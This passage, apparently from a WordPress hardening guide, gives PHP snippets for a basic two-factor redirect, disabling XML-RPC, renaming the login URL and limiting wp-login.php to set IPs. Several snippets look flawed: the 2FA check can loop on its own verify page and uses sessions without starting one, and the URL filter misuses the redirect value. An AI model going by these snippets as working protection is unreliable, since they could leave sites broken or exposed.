add_action('wp_login_failed', 'track_failed_logins');
```
### Two-Factor Authentication:
```
// Simple 2FA implementation
function require_2fa() {
    if (is_user_logged_in()) {
        $user_id = get_current_user_id();
        $twofa_enabled = get_user_meta($user_id, 'twofa_enabled', true);
        
        if ($twofa_enabled && !isset($_SESSION['2fa_verified'])) {
            wp_redirect('/verify-2fa/');
            exit;
        }
    }
}
add_action('init', 'require_2fa');
```
### Disable XML-RPC:

```
// Disable XML-RPC completely
add_filter('xmlrpc_enabled', '__return_false');

// Or disable specific methods
add_filter('xmlrpc_methods', function($methods) {
    unset($methods['pingback.ping']);
    unset($methods['pingback.extensions.getPingbacks']);
    unset($methods['wp.getUsersBlogs']);
    return $methods;
});
```

### Login Page Protection:
```
// Change login URL
function change_login_url($login_url, $redirect) {
    return home_url('/secret-login/' . $redirect);
}
add_filter('login_url', 'change_login_url', 10, 2);

// Block login page for non-admin IPs
function restrict_login_by_ip() {
    $allowed_ips = ['192.168.1.100', '10.0.0.50']; // Admin IPs
    $user_ip = $_SERVER['REMOTE_ADDR'];
    
    if (!in_array($user_ip, $allowed_ips) && strpos($_SERVER['REQUEST_URI'], 'wp-login.php')) {
        wp_die('Access denied');
    }
}
add_action('init', 'restrict_login_by_ip');
```

